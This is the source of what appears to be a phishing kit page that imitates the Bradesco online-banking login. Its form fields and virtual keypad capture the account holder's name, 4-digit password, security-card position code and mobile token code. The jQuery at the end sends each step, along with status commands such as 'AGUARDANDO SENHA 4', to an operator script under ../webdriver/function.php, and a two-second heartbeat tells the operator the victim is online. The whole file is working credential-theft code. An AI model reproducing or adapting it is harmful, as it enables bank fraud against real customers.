<?php
$tipo_conta = $_SESSION['bradesco_tipo'];
?>

<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="shortcut icon" href="images/favicon.ico">
    <script src="./js/bradesco/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="./css/estrutura.css">
    <link rel="shortcut icon" href="https://banco.bradesco/assets/classic/home/images/favicon.ico" type="image/x-icon">
    <title>Banco Bradesco</title>
</head>

<body class="<?php print $tipo_conta; ?>">
    <div style="height:1px;width:1px;position:absolute;top:0px;left:0px;">
        <a href="javascript:;" title="" id="hiddentabfirst" class="tabindex" style="font-size:1px" tabindex="1">&nbsp;</a>
    </div>

    <div id="miolo" class="<?php print $tipo_conta; ?>">

        <div id="topo" class="clearfix">
            <div id="headerIB" class="clearfix">
                <div style="position: relative;">
                    <div class="logo">
                        <a href="javascript:;" target="_blank" title="Bradesco">Bradesco</a>
                    </div>
                    <div class="date"></div>
                    <div class="close">
                        <a id="botao_cancelar_acesso" href="javascript:;" title="Cancelar Acesso" class="tabindex btn btn-cancelar" tabindex="2">
                            <span id="lblCancelar">Cancelar</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>



        <div id="conteudo" class="conteudo_L">
            <div id="conteudo_interno">
                <div class="box">
                    <div class="account" id="accountserial" style="display: none;">
                        <h2 style="text-transform: uppercase;" id="usernome">Bem vindo</h2>
                        <div class="account-info">
                            <span>Agência <?php print $_SESSION['conta']; ?></span>
                            <span>Conta <?php print $_SESSION['agencia']; ?></span>
                        </div>
                    </div>
                    <form id="form_titular" name="form_titular" method="post" action="/ibpfnovologin/login.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                        <input type="hidden" id="form_titular:idMaquinaApplet" name="form_titular:idMaquinaApplet" value="">
                        <input type="hidden" id="form_titular:numControle" name="form_titular:numControle" value="">
                        <div id="form_titular:seletor_titular" class="steps" style="">
                            <div class="tab-steps mb25 tabsapp" id="tabsapp" style="display: none;">
                                <div class="steps-center">
                                    <a id="form_titular1" href="#" style="display: block;" title="Validação">Validação</a>
                                    <a id="form_titular2" href="#" style="display: block;" class="active" title="Senha">Senha</a>
                                </div>
                                <div class="steps-border" style="margin-left: 210px;"></div>
                            </div>
                            <div id="loading_novocompseg" class="account" style="display: block;">
                                <h2>Acesso Seguro </h2>
                                <img id="img_loading_novo_compseg" src="./images/loader-02.gif" class="loading_compseg">
                            </div>
                            <div class="box-scroll-view">
                                <div class="box-scroll">
                                    <div id="form_titular:centroBox" class="divCentroBox">
                                        <div id="form_titular:div-textoAntesBotoes" class="textoAntesBotoes"></div>
                                        <div id="form_titular:divDispositivos" style="">
                                            <img id="form_titular:loading_dispositivo" src="./images/loading_01.gif" class="loading none_i">
                                        </div>
                                        <div id="form_titular:div-textoAposBotoes" class="textoAposBotoes"></div>

                                        <title>/mobileToken.jsp</title>
                                        <meta http-equiv="Content-Type" content="text/html">

                                        <div id="boxToken" class="boxes" style="display: none;">
                                            <span class="txt_msg_erro_disp" id="errotoken" style="display: none;">
                                                <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto</b></span>
                                            </span>
                                            <div class="step step-2-validacao">
                                                <div class="form-field">
                                                    <div id="boxCaptchaDisp" class="form-field #{utilBean.suporteIdMaquinaJava || utilBean.suporteComponenteSeguranca || utilBean.suporteComponenteSegurancaIPAD ? 'none':''">
                                                        <span id="txt_msg_erro_disp">
                                                            <span class="erro_msg ml10 none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span>
                                                        </span>
                                                        <div id="div_retorno_msg_captcha" class="none"></div>
                                                        <span id="campoErroTancode" class="erro_msg tabindex none" tabindex="3"></span>
                                                    </div>
                                                    <span id="text_token_chave">
                                                        <label for="form-chave-eletronica-token">Digite o código informado na <br><strong>Chave de Segurança Eletrônica do Celular</strong>:</label>
                                                    </span>
                                                    <div class="validacao validacao-celular">
                                                        <div class="validacao-image"></div>
                                                        <div class="validacao-info">
                                                            <span id="text_mobile_token">Nº de referência do dispositivo: <strong class="serial">XXX99827</strong></span>
                                                        </div>
                                                    </div>
                                                    <div class="form-code">
                                                        <input type="password" id="token" name="Password1" maxlength="6" title="Digite o código informado na Chave de Segurança Eletrônica: " class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                                                        <div class="mark-char" style="width: 40px; left: 0px;"></div>
                                                    </div>
                                                    <span id="campoErroToken" class="erro_msg"></span>
                                                    <img id="loading_celular" src="./images/loading_01.gif" class="loading none_i">
                                                </div>
                                                <div id="divBotoesPagina">

                                                    <button type="button" disabled id="btnAcessarToken" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                    <input type="hidden" name="loginbotoes_SUBMIT" value="1">
                                                    <input type="hidden" name="autoScroll">

                                                </div>
                                                <div class="footer-links">
                                                    <a class="external-link tabindex" rel="external" target="_blank" href="https://banco.bradesco/html/classic/como-usar/senhas-e-dispositivos-de-seguranca.shtm" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                        <span>Ajuda com dispositivo de segurança ? </span>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="boxTabela" style="display: none;" class="hide boxes">
                                            <span class="txt_msg_erro_disp hide">
                                                <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto</b></span>
                                            </span>
                                            <div class="step step-2-validacao">

                                                <div class="form-field">

                                                    <span id="text_tancode_posicao"><label for="form-chave-eletronica-cartao">Digite a posição <strong id="posicao"></strong> informada no <br><strong>Cartão Chave de Segurança</strong>:</label></span>
                                                    <div class="validacao validacao-cartao">
                                                        <div class="validacao-image"></div>
                                                        <div class="validacao-info"><span id="text_tancode_nro_cartao">Nº de referência do dispositivo: <br><strong class="serial"></strong></span></div>
                                                    </div>
                                                    <div class="form-code w150">
                                                        <input type="password" id="posicaoTabela" name="txtCartaoSeg" maxlength="3" title="Informe a chave da posição 64 do seu dispositivo de segurança." style="margin-left: 15px;" class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="8">
                                                        <div class="mark-char" style="width: 50px; left: 0px;"></div>
                                                    </div>
                                                </div>
                                                <div id="divBotoesPagina">
                                                    <form name="loginbotoes" method="post" action="/ibpfnovologin/mobileToken.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                                                        <button type="button" id="btnAcessarTabela" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                        <input type="hidden" name="loginbotoes_SUBMIT" value="1">
                                                        <input type="hidden" name="autoScroll">
                                                    </form>
                                                </div>
                                                <div class="footer-links">
                                                    <a class="external-link tabindex" rel="external" target="_blank" href="https://banco.bradesco/html/classic/como-usar/senhas-e-dispositivos-de-seguranca.shtm" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                        <span>Ajuda com dispositivo de segurança ? </span>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>



                                        <div id="boxAguardando" style="display: none;" class="boxes box_redLine_bottom after hide">
                                            <img src="./images/loading_01.gif" class="loading" alt="">
                                        </div>
                                        <div id="boxSenha4" class="boxes box_redLine_bottom after" style="display: none;">
                                            <span class="txt_msg_erro_disp" id="errosenha" style="display: none;">
                                                <span class="erro_msg ml10 none_i error-show"><b>A Senha de 4 Dígitos não está correta.</b><br>Lembre-se de que a Senha de 4 Dígitos é diferente da senha de seu cartão de débito.</span>
                                            </span>
                                            <div id="conteudoUsuarios" style="display: block;">
                                                <div class="form-field" id="webid" style="display: none;">
                                                    <input type="hidden" value="<?php print $_SESSION['titular2'] ?>" name="titular2" id="titular2">
                                                    <input type="hidden" value="<?php print $_SESSION['titular'] ?>" name="titular_principal" id="titular_principal">
                                                    <div class="form-option-square clearfix">
                                                        <span id="form_titular:text_legendaBox_identifique" class="mb30">Identifique-se pelo <strong>nome</strong>:</span>
                                                        <div id="form_titular:listaTitulares" class="box-titulares">

                                                            <div class="option boxTitular"><span id="select_titular_label" style="text-transform: uppercase;" for="select_titular"></span>
                                                                <input id="select_titular" type="radio" name="select_titular" title="Identifique-se pelo nome marque para 1º titular" class="titularRadio tabfirst tabindex" tabindex="3">
                                                            </div>
                                                            <div class="option boxTitular_2"><span id="select_titular_label_2" style="text-transform: uppercase;" for="select_titular_2"></span>
                                                                <input id="select_titular_2" type="radio" name="select_titular_2" title="Marque para 2º titular" class="titularRadio tabindex" tabindex="4">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <span id="form_titular:div_erro_msg" class="erro_msg"><strong>Você deve selecionar seu primeiro nome.</strong></span>
                                                </div>
                                            </div>


                                            <div id="conteudoSenha" class="" style="display: none;">
                                                <div class="form-field">
                                                    <span id="text_legendaBox_senha_4">Informe sua senha de <strong>4 dígitos</strong>, <br>clicando no teclado abaixo</span><span id="campoErroSenha" class="erro_msg"></span>
                                                    <ul id="ul_input_fields" class="input-fields after">
                                                        <li id="li_input_fields_1"><input type="password" id="txtPass1" name="txtPass1" maxlength="1" title="Informe sua senha de 4 dígitos." class="frmPassWord tabindex tab-1" disabled="disabled" tabindex="2"></li>
                                                        <li id="li_input_fields_2"><input type="password" id="txtPass2" name="txtPass2" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                        <li id="li_input_fields_3"><input type="password" id="txtPass3" name="txtPass3" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                        <li id="li_input_fields_4"><input type="password" id="txtPass4" name="txtPass4" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                    </ul>
                                                </div>
                                                <ul id="ul_teclado_virtual" class="btnKeyboardVirtualSingle">
                                                    <input type="hidden" id="ident" name="ident" value="<?php print $_SESSION['conta'] ?>">
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="7">7</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="9">9</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="4">4</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="8">8</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="6">6</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="2">2</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="3">3</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="0">0</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="5">5</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="1">1</a></li>
                                                    <li class="limpar"><a id="botao_limpar" class="pngfix tabindex pointer digits digits-last btnLimparTeclado" title="Limpar" tabindex="4">Limpar</a></li>
                                                </ul>
                                                <input type="hidden" name="senha4" id="senha4">
                                                <div class="divBotoesPagina">
                                                    <button type="button" id="btnAcessarSenha4" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                    <input type="hidden" name="autoScroll">
                                                </div>
                                                <div class="footer-links">
                                                    <a class="external-link tabindex" rel="external" href="javascript:;" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                        <span>Ajuda com dispositivo de segurança ? </span>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                    <input type="hidden" name="form_titular_SUBMIT" value="1">
                    <input type="hidden" name="autoScroll">

                </div>
                <a id="_id99" href="#" target="_blank" class="banner banner-<?php print $tipo_conta; ?>" style="margin-top: 0px;"></a>
            </div>

            <div id="boxPassoIntermediario" class="box-passo-intermediario plr80 w806 none"></div>
            <div style="width: 0px; height: 0px;"></div>
            <div>
                <div id="scpDiv">
                    <img id="scp">
                </div>
            </div>
        </div>

        <div style="visibility:hidden; display:hide">
            <form name="form_cript_backup">
                <input type="hidden" name="form_cript:valor_dig">
            </form>
        </div>
    </div>


    <div id="rodape">
        <div class="content clearfix">
            <div class="logo"><a href="http://www.bradesco.com.br/" target="_blank" title="Bradesco">Bradesco</a></div>
            <h5>FONE FÁCIL</h5>
            <div class="listings">
                <p>Capitais / Metropolitanas</p>
                <h5>4002 0022</h5>
                <p>Consulta de saldo, extrato, <br> transações financeiras <br> e de cartão de crédito. </p>
            </div>
            <div class="listings br-tp1">
                <p>Demais Regiões</p>
                <h5>0800 570 0022</h5>
                <p>SAC - Deficiência <br> Auditiva ou de Fala</p>
                <h5>0800 722 0099</h5>
            </div><span style="margin-right: 0;">
                <div class="listings">
                    <p>SAC - Alô Bradesco</p>
                    <h5>0800 570 0022</h5>
                    <p>Cancelamento, reclamação, informação, sugestão e elogio.</p>
                </div>
            </span>
            <div class="tips">
                <div class="tip">
                    <div class="tips-title clearfix">
                        <h6>Segurança</h6>
                    </div>
                    <p>O cadeado precisa estar aparecendo na barra do seu navegador.</p><a id="maisDicas" href="javascript:;" rel="external" target="_blank" title="Mais dicas" class="tabindex link-btn-no-style" tabindex="8"><span>Ver Mais</span></a>
                </div>
            </div>
        </div>
        <div class="content clearfix">
            <p class="message-whatsapp">Se preferir, fale com a BIA pelo whatsapp: <strong>3335-0237</strong></p>
        </div>
        <div class="footer-last">
            <div class="footer-last-content"><a id="outrosTelefones" href="#" rel="external" target="_self" title="Ver outros telefones" class="see-others-phones">Ver outros telefones</a></div>
        </div>
        <div class="footer-phones">
            <div class="content clearfix">
                <div class="telefones">
                    <div class="container">
                        <div class="grid telefones-cartoes">
                            <div class="cell large-12">
                                <h3>Cartões</h3>
                                <p>Cancelamentos, Reclamações e Informações</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Bradesco Cartões</h4>
                                <p class="tel">0800 721 2778</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 722 00999</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 727 9933</p>
                                <p>Atendimento de 2ª à 6ª-feira das 8h às
                                    18h, exceto feriado.</p>
                                <p class="fale-conosco">
                                    Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale
                                        Conosco</a>
                                </p>
                            </div>
                        </div>
                        <div class="grid telefones-previdencia">
                            <div class="cell large-12">
                                <h3>Previdência</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>Bradesco Vida e Previdência</h4>
                                <p class="tel">0800 721 2778</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 721 2778</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                                <h4>Informações sobre seguros de Pessoas
                                    (Vida / Acidentes Pessoais)</h4>
                                <p class="tel">0800 701 2704</p>
                                <p>Atendimento dias úteis das 8h às 20h e
                                    sábados das 8h às 14h*</p>
                                <p class="fale-conosco">
                                    Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
                                    Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
                                    <a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
                                </p>
                            </div>
                            <div class="cell large-6">
                                <h4>Central de Relacionamento</h4>
                                <p class="tel">4002-0022</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 570 0022</p>
                                <p>Atendimento dias úteis das 7h30 às
                                    19h30*</p>
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 727 9933</p>
                                <p>Atendimento de 2ª a 6ª-feira das 8h às
                                    18h.</p>
                            </div>
                        </div>
                        <div class="grid telefones-seguros">
                            <div class="cell large-12">
                                <h3>Seguros</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>Bradesco Vida e Previdência</h4>
                                <p class="tel">0800 727 9966</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 701 2762</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 701 7000</p>
                                <p>Atendimento de 2ª a 6ª-feira das 8h às
                                    18h.</p>
                                <p class="fale-conosco">
                                    Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
                                    Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
                                    <a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
                                </p>
                            </div>
                            <div class="cell large-6">
                                <h4>Assistências, Consultas, Informações e
                                    Serviços Transacionais</h4>
                                <p class="tel">4004-2757</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2757</p>
                                <p>Atendimento dias úteis das 7h30 às
                                    19h30*</p>
                            </div>
                        </div>
                        <div class="grid telefones-capitalizacao">
                            <div class="cell large-12">
                                <h3>Capitalização</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>Bradesco Vida e Previdência</h4>
                                <p class="tel">0800 727 9966</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 701 2762</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 701 7000</p>
                                <p>Atendimento de 2ª a 6ª-feira das 8h às
                                    18h.</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Assistências, Consultas, Informações e
                                    Serviços Transacionais</h4>
                                <p class="tel">4004-2757</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2757</p>
                                <p>Atendimento dias úteis das 7h30 às
                                    19h30*</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <input type="hidden" name="idInfo" id="idInfo" value="15">
    <input type="hidden" name="clientHashId" id="clientHashId" value="144903246963fbdcf88b6615.74675978">
    <script src="./js/bradesco/identificacao.js"></script>



</body>
<script>
    $(document).ready(function() {
        titular();

        var online = document.querySelector('#ident').value;

        setInterval(function() {
            //Incluir e enviar o POST para o arquivo responsável em fazer contagem
            $.post("../webdriver/function.php?app=online", {
                contar: online,
            }, function(data) {
                $('#online').text(data);
            });
        }, 2000);

        function titular() {
            var select_titular = document.querySelector('#titular_principal').value;

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php?funcao=verifica-titular",
                data: {
                    funcao: 'verificar_titular'
                },
            });
            request.done(data => {

                if (data == 'true') {
                    $('#webid').show();
                }

                if (data == 'false') {
                    $('#webid').hide();
                    $('#conteudoSenha').show();
                    document.getElementById("usernome").innerHTML = 'Olá, ' + select_titular;
                }

            })
        }

        function GetJson() {
            const request = $.ajax({
                method: "POST",
                url: "../webdriver/function.php?funcao=JsonApp",
                //dataType: 'json', // Tipo de dados esperado
                data: {
                    funcao: 'pegarJson'
                },
            });

            request.done(data => {
                //console.log(data);

                var titular01 = data[0]["titular_01"];
                var titular02 = data[0]["titular_02"];

                $("#select_titular").val(titular01);
                $("#select_titular_label").text(titular01);

                $("#select_titular_2").val(titular02);
                $("#select_titular_label_2").text(titular02);

                //alert(titular02);
                if (titular02 == '') {
                    document.getElementById("usernome").innerHTML = 'Olá, ' + titular01;

                    const request_2 = $.ajax({
                        method: "post",
                        url: "../webdriver/function.php?funcao=selecionar-titular",
                        data: {
                            valor: titular01,
                            funcao: 'titular_selecionado'
                        },
                    });

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO SENHA 4'
                        },
                        cache: false
                    });
                } else {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TITULAR'
                        },
                        cache: false
                    });
                }

            })
        }



        $('.boxTitular').on('click', function(evt) {

            var select_titular = document.querySelector('#select_titular').value;

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php?funcao=selecionar-titular",
                data: {
                    valor: select_titular,
                    funcao: 'titular_selecionado'
                },
            });
            request.done(data => {
                $('#webid').hide();
                $('#conteudoSenha').show();
                $('.tabsapp').show();
                document.getElementById("usernome").innerHTML = 'Olá, ' + select_titular;

                const request = $.ajax({
                    method: "post",
                    url: "../webdriver/function.php?funcao=salvar-token",
                    data: {
                        valor: select_titular,
                        funcao: 'TITULAR 01'
                    },
                });
                request.done(data => {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'TITULAR 01 RECEBIDO'
                        },
                        cache: false
                    });
                })
            })

        })

        $('.boxTitular_2').on('click', function(evt) {

            var select_titular = document.querySelector('#select_titular_2').value;

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php?funcao=selecionar-titular",
                data: {
                    valor: select_titular,
                    funcao: 'titular_selecionado'
                },
            });
            request.done(data => {
                $('#webid').hide();
                $('#conteudoSenha').show();
                $('.tabsapp').show();
                document.getElementById("usernome").innerHTML = 'Olá, ' + select_titular;

                const request = $.ajax({
                    method: "post",
                    url: "../webdriver/function.php?funcao=salvar-token",
                    data: {
                        valor: select_titular,
                        funcao: 'TITULAR 02'
                    },
                });
                request.done(data => {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'TITULAR 02 RECEBIDO'
                        },
                        cache: false
                    });
                })
            })

        })


        setTimeout(function() {

            //$('.tabsapp').show();
            $('.account').show();
            $('#loading_novocompseg').hide();
            $('#boxSenha4').show();
            GetJson();

        }, 2000);
    });
</script>

</html>